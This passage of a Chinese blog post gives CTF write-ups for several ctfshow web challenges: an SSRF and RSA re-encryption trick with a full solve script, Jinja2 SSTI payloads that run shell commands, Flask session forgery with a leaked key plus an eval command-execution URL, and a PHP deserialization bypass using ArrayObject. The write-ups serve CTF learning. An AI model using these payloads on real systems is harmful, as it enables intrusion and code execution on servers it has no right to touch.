        reqpose <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        re_text <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"(?&lt;=&lt;/code&gt;).*"</span><span class="token punctuation">,</span> reqpose<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">''</span> <span class="token keyword">not</span> <span class="token keyword">in</span> re_text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>re_text<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            d <span class="token operator">+=</span> <span class="token number">1</span>
</code></pre> 
<h3><a id="web_327"></a>暗网聊天室(假web真密码)</h3> 
<p>不会密码直接放官方wp</p> 
<h4><a id="1_331"></a>1.刚开始的聊天界面</h4> 
<p><img src="https://images2.imgbox.com/bb/ae/ZPksPbo3_o.png" alt="img"></p> 
<p><strong>重点信息：</strong></p> 
<ul><li>1.提示要本地访问 9999 端口，可能存在 SSRF</li><li>2.提示要访问 “点我进入宇宙商城” 链接</li><li>3.提示 FLAG 存在于热门网站向其他人发的宣传语中</li><li>4.宣传语长度&gt;128</li><li>5.右上角的插件可以用</li></ul> 
<h4><a id="2_343"></a>2.点开插件，出现新页面</h4> 
<p><img src="https://images2.imgbox.com/4a/76/4o8gV25k_o.png" alt="image-20230405120303218"></p> 
<p>介绍了匿名原理，并附上了加密代码</p> 
<ul><li>\1. 可以看到加密是以 128 为一组，想到宣传语长度&gt;128，说明 FLAG 和一些字为一组、下 一个节点的 IP 和一些字为一组</li><li>\2. 顶部是插件拦截的 自己的私钥、传来的原始数据、用自己私钥解密后的数据、发包按 钮，类似 Burp 的改包功能</li><li>\3. 通过原始数据的长度 18944，可以推断自己位于节点 1 先自己在本地尝试加密</li></ul> 
<p><img src="https://images2.imgbox.com/63/1a/2DouyFnd_o.png" alt="image-20230405120319554"></p> 
<p>发现一组加密后的长度为 512，而加密是 128 一组</p> 
<p><img src="https://images2.imgbox.com/0c/60/g5HGGDg7_o.png" alt="image-20230405120334385"></p> 
<h4><a id="3__359"></a>3.访问 “点我进入宇宙商城“</h4> 
<p>看看是否可以利用 SSRF 获取敏感信息</p> 
<p><img src="https://images2.imgbox.com/88/df/n7je5bSg_o.png" alt="image-20230405120351623"></p> 
<p>可以看到自己 IP，想到加密也利用到了 IP，可能有用 查看 robots.txt</p> 
<p><img src="https://images2.imgbox.com/d1/f8/c5HN8LqL_o.png" alt="image-20230405120402666"></p> 
<p>查看 shop.py.bak</p> 
<p><img src="https://images2.imgbox.com/c8/d2/WS1OnsVU_o.png" alt="image-20230405120415647"></p> 
<p>想到本地访问 9999 端口 /shop?api=127.0.0.1:9999</p> 
<p><img src="https://images2.imgbox.com/38/d2/wyHt6OWJ_o.png" alt="image-20230405120429341"></p> 
<p>获取到 3 个节点的公钥，可以自己进行加密 通过该网站的公钥 1 和自己的私钥 1 进行加解密，发现可行，说明该网站就是用户 A 想到如果对自己 IP 进行加密，然后替换“解密后的数据“中的用户 B 的 IP，那么最终明文 将发送给自己</p> 
<h4><a id="4_Payload_379"></a>4.构造 Payload</h4> 
<p>还是这个图</p> 
<p><img src="https://images2.imgbox.com/58/fe/0CY49Qlo_o.png" alt="image-20230405120442584"></p> 
<p>第二行就是插件中的“解密后的数据”，可以看到第二个 4*512 就是用户 B 的 IP 利用两个公钥加密自己 IP 并替换：</p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_v1_5
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> abort
<span class="token comment"># 加密</span>
<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> public_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
 cipher <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">)</span>
 ciphertext <span class="token operator">=</span> <span class="token string">''</span>
 <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
 ciphertext <span class="token operator">+=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>plaintext<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">return</span> ciphertext
IP <span class="token operator">=</span> <span class="token string">'2.56.12.89'</span>
plaintext_half <span class="token operator">=</span> <span class="token string">'拦截的 解密后的数据'</span>
<span class="token comment"># 公钥开头、结尾有俩\n</span>
public_key2 <span class="token operator">=</span> '<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>BEGIN PUBLIC KEY<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>\nxxx\n<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>END PUBLIC KEY<span class="token operator">-</span><span class="token operator">-</span>
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>'
public_key3 <span class="token operator">=</span> '<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>BEGIN PUBLIC KEY<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>\nxxx\n<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>END PUBLIC KEY<span class="token operator">-</span><span class="token operator">-</span>
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>'
IP_ciphertext <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> public_key3<span class="token punctuation">)</span>
IP_ciphertext <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>IP_ciphertext<span class="token punctuation">,</span> public_key2<span class="token punctuation">)</span>
<span class="token comment"># 替换最终 IP</span>
plaintext_half_new <span class="token operator">=</span> plaintext_half<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2048</span><span class="token punctuation">]</span> <span class="token operator">+</span> IP_ciphertext <span class="token operator">+</span> 
plaintext_half<span class="token punctuation">[</span><span class="token number">4096</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>plaintext_half_new<span class="token punctuation">)</span>

</code></pre> 
<p>将新生成的数据替换“解密后的数据”，发送即可获取 FLAG 因为最终传递的 IP 是你自己</p> 
<p><img src="https://images2.imgbox.com/83/95/HlYjUqZT_o.png" alt="image-20230405120510490"></p> 
<h4><a id="5_418"></a>5.一把梭脚本</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> re
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_v1_5
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> abort

url <span class="token operator">=</span> <span class="token string">'http://xxx.challenge.ctf.show/'</span> <span class="token comment"># 题目URL，先等几秒再运行</span>

<span class="token comment"># 加密</span>
<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> public_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cipher <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">)</span>

    ciphertext <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        ciphertext <span class="token operator">+=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>plaintext<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> ciphertext

<span class="token keyword">def</span> <span class="token function">get_plaintext_half</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'/update'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'[^@]*\.92'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">get_public_key</span><span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'/shop?api=127.0.0.1:9999'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'-----BEGIN PUBLIC KEY-----\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n-----END PUBLIC KEY-----'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">[</span>public_key<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

IP <span class="token operator">=</span> <span class="token string">'2.56.12.89'</span>
plaintext_half <span class="token operator">=</span> get_plaintext_half<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 获取解密后的数据</span>

<span class="token comment"># 获取公钥2、3</span>
public_key2 <span class="token operator">=</span> get_public_key<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'-----BEGIN PUBLIC KEY-----'</span><span class="token punctuation">,</span><span class="token string">'-----BEGIN PUBLIC KEY-----\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'-----END PUBLIC KEY-----'</span><span class="token punctuation">,</span><span class="token string">'\n-----END PUBLIC KEY-----'</span><span class="token punctuation">)</span>
public_key3 <span class="token operator">=</span> get_public_key<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'-----BEGIN PUBLIC KEY-----'</span><span class="token punctuation">,</span><span class="token string">'-----BEGIN PUBLIC KEY-----\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'-----END PUBLIC KEY-----'</span><span class="token punctuation">,</span><span class="token string">'\n-----END PUBLIC KEY-----'</span><span class="token punctuation">)</span>

<span class="token comment"># 两次加密</span>
IP_ciphertext <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> public_key3<span class="token punctuation">)</span>
IP_ciphertext <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>IP_ciphertext<span class="token punctuation">,</span> public_key2<span class="token punctuation">)</span>

<span class="token comment"># 替换最终IP</span>
plaintext_half_new <span class="token operator">=</span> plaintext_half<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2048</span><span class="token punctuation">]</span> <span class="token operator">+</span> IP_ciphertext <span class="token operator">+</span> plaintext_half<span class="token punctuation">[</span><span class="token number">4096</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

<span class="token comment"># 请求</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'/pass_message'</span><span class="token punctuation">,</span>data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'message'</span><span class="token punctuation">:</span>plaintext_half_new<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment"># 接收明文</span>
text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'/update'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'ctfshow{.*}'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h3><a id="easy_ssti_472"></a>easy_ssti</h3> 
<p>看源码，提示<code>app.zip</code>，访问一下下载下来</p> 
<p><img src="https://images2.imgbox.com/88/b3/ZfEjn1SX_o.png" alt="image-20230405003551238"></p> 
<p>模板渲染是在hello目录下，尝试注入</p> 
<p><img src="https://images2.imgbox.com/82/55/gYFfDCjf_o.png" alt="image-20230405003719284"></p> 
<p>有ssti漏洞，没有任何过滤，自己构造或直接百度都可</p> 
<pre><code class="prism language-shell">/<span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span><span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__mro__<span class="token punctuation">[</span>-1<span class="token punctuation">]</span>.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> 
<p>但在读flag的时候好像把/和f给过滤了，用base64读即可</p> 
<pre><code class="prism language-shell"><span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span><span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__mro__<span class="token punctuation">[</span>-1<span class="token punctuation">]</span>.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'echo "Y2F0IC9mbGFn"|base64 -d|sh'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/41/df/HasPx9fR_o.png" alt="image-20230405003934859"></p> 
<h3><a id="easy_flask_496"></a>easy_flask</h3> 
<p>一个登录页面，随便注册一个账号登进去</p> 
<p><img src="https://images2.imgbox.com/46/90/QFq11mAo_o.png" alt="image-20230405004205502"></p> 
<p>要admin账户，但可以看源码</p> 
<p><img src="https://images2.imgbox.com/b2/49/PaFV797B_o.png" alt="image-20230405004238489"></p> 
<p>这里给了key，八成是<code>session</code>伪造，登录抓包拿到session</p> 
<p>key=<code>S3cr3tK3y</code></p> 
<p><img src="https://images2.imgbox.com/36/5a/1qvQ9qnR_o.png" alt="image-20230405004521164"></p> 
<p>用<code>flask_session_cookie_manager3</code>解密</p> 
<p><img src="https://images2.imgbox.com/42/80/IrpjHUKU_o.png" alt="image-20230405004749051"></p> 
<p>将user改为admin再加密</p> 
<p><img src="https://images2.imgbox.com/86/20/fmZj8uec_o.png" alt="image-20230405004913311"></p> 
<p>修改session发包登录</p> 
<p><img src="https://images2.imgbox.com/2a/d5/0RcIr4Vk_o.png" alt="image-20230405005153261"></p> 
<p>但这里只有一个假的flag看源码发现</p> 
<p><img src="https://images2.imgbox.com/c8/7e/QVgkuPoi_o.png" alt="image-20230405005251266"></p> 
<p>应该有任意文件下载，尝试下载源码</p> 
<pre><code class="prism language-shell">/download/?filename<span class="token operator">=</span>app.py
</code></pre> 
<p>成功得到源码</p> 
<p>在源码里看到</p> 
<p><img src="https://images2.imgbox.com/0d/5a/vHZPQmoQ_o.png" alt="image-20230405005518138"></p> 
<p>在hello路由下可以直接命令执行</p> 
<p><img src="https://images2.imgbox.com/22/83/fXgTeBZp_o.png" alt="image-20230405005732756"></p> 
<pre><code class="prism language-shell">/hello/?eval<span class="token operator">=</span>__import__<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span>.popen<span class="token punctuation">(</span><span class="token string">"cat /flag_is_h3re"</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h3><a id="easy_php_548"></a>easy_php</h3> 
<p>源码</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">{<!-- --></span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"not allowed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1+1&gt;2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^[Oa]:[\d]+/i"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<p>先不看过滤，只要执行<code>__destruct()</code>中的<code>system</code>函数即可，给<code>ctfshow</code>赋值</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">{<!-- --></span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"not allowed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">-&gt;</span> <span class="token property">ctfshow</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>

    
 <span class="token comment">//O:7:"ctfshow":1:{s:7:"ctfshow";s:6:"whoami";}</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/8c/ee/szv9LK81_o.png" alt="image-20230405113920158"></p> 
<p>再看过滤</p> 
<pre><code class="prism language-shell">if<span class="token punctuation">(</span><span class="token operator">!</span>preg_match<span class="token punctuation">(</span><span class="token string">"/^[Oa]:[\d]+/i"</span>, <span class="token variable">$data</span><span class="token punctuation">))</span>
</code></pre> 
<p>不能传入以O和a开头的序列化值,也就是对象和数组的序列化值.</p> 
<p>在php低版本中，O或a的冒号后的数字前可以加一个+来进行绕过。但这个题目的版本是7.3无法绕过</p> 
<p>看其他师傅的可以将0替换为C来绕过</p> 
<p>payload</p> 
<pre><code class="prism language-shell">C:7:<span class="token string">"ctfshow"</span>:1:<span class="token punctuation">{<!-- --></span>s:7:<span class="token string">"ctfshow"</span><span class="token punctuation">;</span>s:6:<span class="token string">"whoami"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<p>但放到题目中并不通</p> 
<p>猜测是题目中的ctfshow类未实现serializable接口，所以不能解析该属性。所以找php中内置的实现了Serializable接口的类</p> 
<p>wp使用了<code>ArrayObject()</code>类，使用这个类去修饰<code>ctfshow</code>类</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
<span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">-&gt;</span> <span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>

 <span class="token comment">//C:11:"ArrayObject":74:{x:i:0;a:0:{};m:a:1:{s:1:"a";O:7:"ctfshow":1:{s:7:"ctfshow";s:6:"whoami";}}}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/6b/e2/eJYovM23_o.png" alt="image-20230405114303695"></p> 
<p>成功回显</p> 
<p><img src="https://images2.imgbox.com/9f/c2/W70Iv8Qn_o.png" alt="image-20230405115145316"></p> 
<p>最终payload</p> 
<pre><code class="prism language-shell">?1%2b<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span><span class="token number">2</span><span class="token operator">=</span>C:11:<span class="token string">"ArrayObject"</span>:75:<span class="token punctuation">{<!-- --></span>x:i:0<span class="token punctuation">;</span>a:0:<span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">;</span>m:a:1:<span class="token punctuation">{<!-- --></span>s:1:<span class="token string">"a"</span><span class="token punctuation">;</span>O:7:<span class="token string">"ctfshow"</span>:1:<span class="token punctuation">{<!-- --></span>s:7:<span class="token string">"ctfshow"</span><span class="token punctuation">;</span>s:7:<span class="token string">"cat /f*"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> 
<h3><a id="easy_class_662"></a>easy_class(不会)</h3> 
<p>直接放大佬的wp</p> 
<p><img src="https://images2.imgbox.com/c3/d6/mF4g9bTV_o.png" alt=""></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/bc22883227a8eac917e6e0a91259fe22/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">mysql8增加远程用户访问</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/ac18f6f2bb3b73268f33a49105916f57/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">GitHub Action 使用</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>